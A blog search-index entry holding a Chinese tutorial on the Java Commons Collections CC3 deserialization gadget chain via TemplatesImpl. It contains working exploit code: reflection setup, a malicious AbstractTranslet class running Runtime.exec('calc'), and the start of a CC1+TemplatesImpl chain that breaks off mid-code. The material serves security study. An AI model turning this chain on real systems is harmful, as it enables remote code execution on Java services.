<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java反序列化CC3链</title>
    <link href="/post/java-deserialize-cc3-chain-2ngulq.html"/>
    <url>/post/java-deserialize-cc3-chain-2ngulq.html</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化CC3链"><a href="#Java反序列化CC3链" class="headerlink" title="Java反序列化CC3链"></a>Java反序列化CC3链</h1><h1 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h1><p>CC1和CC6都是直接命令调用，而CC3、CC2、CC4这些都是通过动态类加载来实现</p><h2 id="TemplatesImpl解析"><a href="#TemplatesImpl解析" class="headerlink" title="TemplatesImpl解析"></a>TemplatesImpl解析</h2><p>ClassLoader里面的loadclass</p><p>loadclass会调用findclass</p><p>findclass会调用到defineclass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)<br>        <span class="hljs-keyword">throws</span> ClassFormatError<br>    &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, off, len, <span class="hljs-literal">null</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个意思是从字节里面加载一个类</p><p>我们需要找到一个调用它重写它的地方</p><p>最后找到</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027160849-4bzdbjk.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br></code></pre></td></tr></table></figure><p>这里没有protect，也就是说可以被任意调用，然后可以看是哪里调用了这个</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027161142-3tyaqpy.png" alt="image"></p><p>但是这个函数是私有的，我们反过去找看哪里是public，</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027161428-69k1d9z.png" alt="image"></p><p>这里有三个，我们依次看一下返回了什么</p><p>第一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> Class[] getTransletClasses() &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>            <span class="hljs-comment">// Falls through</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> _class;<br>    &#125;<br></code></pre></td></tr></table></figure><p>返回了一个类</p><p>第二个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTransletIndex</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (TransformerConfigurationException e) &#123;<br>            <span class="hljs-comment">// Falls through</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> _transletIndex;<br>    &#125;<br></code></pre></td></tr></table></figure><p>返回了一个下标</p><p>第三个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>            <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>            <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>            <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>            translet.postInitialization();<br>            translet.setTemplates(<span class="hljs-built_in">this</span>);<br>            translet.setServicesMechnism(_useServicesMechanism);<br>            translet.setAllowedProtocols(_accessExternalStylesheet);<br>            <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>                translet.setAuxiliaryClasses(_auxClasses);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> translet;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>给class赋完值之后调用了一个<code>newInstance()</code>​，而<code>newInstance()</code>​是一个初始化的过程，也就是说走完这个函数，就可以进行一个命令执行，那么可以重点关注一下这个函数</p><p>于是通过这个函数再往回找，找到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>    &#123;<br>        TransformerImpl transformer;<br><br>        transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>            _indentNumber, _tfactory);<br><br>        <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;<br>            transformer.setURIResolver(_uriResolver);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>            transformer.setSecureProcessing(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> transformer;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个函数是一个public</p><p>会调用<code>getTransletInstance()</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>            <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>            <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>            <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>            translet.postInitialization();<br>            translet.setTemplates(<span class="hljs-built_in">this</span>);<br>            translet.setServicesMechnism(_useServicesMechanism);<br>            translet.setAllowedProtocols(_accessExternalStylesheet);<br>            <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>                translet.setAuxiliaryClasses(_auxClasses);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> translet;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>在这个里面<code>_class[_transletIndex]</code>​调用<code>newInstance()</code>​</p><p>而<code>_class</code>​的赋值是在<code>defineTransletClasses()</code>​做的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br><br>                <span class="hljs-comment">// Check if this is the main class</span><br>                <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                    _transletIndex = i;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    _auxClasses.put(_class[i].getName(), _class[i]);<br>                &#125;<br>            &#125;<br></code></pre></td></tr></table></figure><p>​<code>_class</code>​的赋值通过<code>loader.defineClass</code>​加载</p><p>那么这条链就可以写一下了</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027165618-jks4u6p.png" alt="image"></p><h2 id="TemplatesImpl利用"><a href="#TemplatesImpl利用" class="headerlink" title="TemplatesImpl利用"></a>TemplatesImpl利用</h2><p>先看一下<code>TemplatesImpl</code>​这个类，继承了两个接口<code>Templates, Serializable</code>​，可以直接序列化</p><p>那么我们就可以先new一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        templates.newTransformer();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后继续看<code>TemplatesImpl</code>​，看哪些需要赋值</p><p>看<code>getTransletInstance()</code>​这个函数</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027170111-hv1au1o.png" alt="image"></p><p>首先要保证<code>_name</code>​  不为空 ， <code>_class</code>​为空，看一下默认值</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027170241-vubpzfq.png" alt="image"></p><p>再看一下<code>defineTransletClasses()</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027170730-svc09gj.png" alt="image"></p><p>如果<code>_bytecodes</code>​是空就会报异常，所以<code>_bytecodes</code>​要赋值</p><p>​<code>_tfactory</code>​要调用方法，所以这个也要赋值</p><p>于是我们通过反射先给这三个参数赋值</p><p>首先<code>_name</code>​赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);<br></code></pre></td></tr></table></figure><p>然后<code>_bytecodes</code>​赋值，先看一下是什么类型</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251027173956-uxn9vkv.png" alt="image"></p><p>再看一下类加载的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br></code></pre></td></tr></table></figure><p>也就是说它传的是一个一维的byte数组，可以这样赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/class/Test.class&quot;</span>));  <br><span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>bytecodes.set(templates,codes);<br></code></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>之后编译一下，放到对应路径下</p><p>最后是<code>_tfactory</code>​赋值</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028161550-ub948lf.png" alt="image"></p><p>这是一个transient，也就是一个不可以序列化的变量</p><p>在readObject方法中对这个属性赋值了</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028161823-f4n3pnt.png" alt="image"></p><p>ok，然后写一下对应赋值代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>这时候预期是会弹计算器，我们运行一下试试</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028171501-8btb3r8.png" alt="image"></p><p>报了一个空指针错误，是在422行</p><p>看一下defineTransletClasses</p><p>下一个断点</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028171650-a5qbhn8.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028173637-mbw52a7.png" alt="image"></p><p>在这里它进行了一个父类的判断 判断它父类是不是这个 ABSTRACT_TRANSLET</p><p>不是的话会调用下面 _auxClasses.put</p><p>那么现在就有两种方法</p><ul><li>要么 让它父类 equals ABSTRACT_TRANSLET</li><li>要么 让 _auxClasses 不为null<br>但是我们注意到下面也有一个判断</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>                ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>            &#125;<br></code></pre></td></tr></table></figure><p>如果 _transletIndex &lt; 0 会抛出异常 而如果不进if语句里(不满足父类 equals ABSTRACT_TRANSLET) _transletIndex就是 -1 也不得行 还会报错</p><p>因此我们应该满足 构造的那个类 父类是 ABSTRACT_TRANSLET</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028174229-vkuz30e.png" alt="image"></p><p>是 abstract抽象类，因此我们也要重写这个类的方法</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028174721-z0b5plz.png" alt="image"></p><p>还有一个tanslate</p><p>修改完的Test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>再执行代码成功弹出计算器</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251028175224-qsu7z2s.png" alt="image"></p><h1 id="CC1-TemplatesImpl"><a href="#CC1-TemplatesImpl" class="headerlink" title="CC1+TemplatesImpl"></a>CC1+TemplatesImpl</h1><p>这里我们通过CC1的sink点 通过transform反射调用 TemplatesImpl.newTransformer()</p><p>再回顾一下CC1的链子</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030093057-usr8xfh.png" alt="image"></p><p>如果说只过滤了Runtime，那后半段就可以用今天学的这种方式做</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20251030093637-6t8047z.png" alt="image"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> 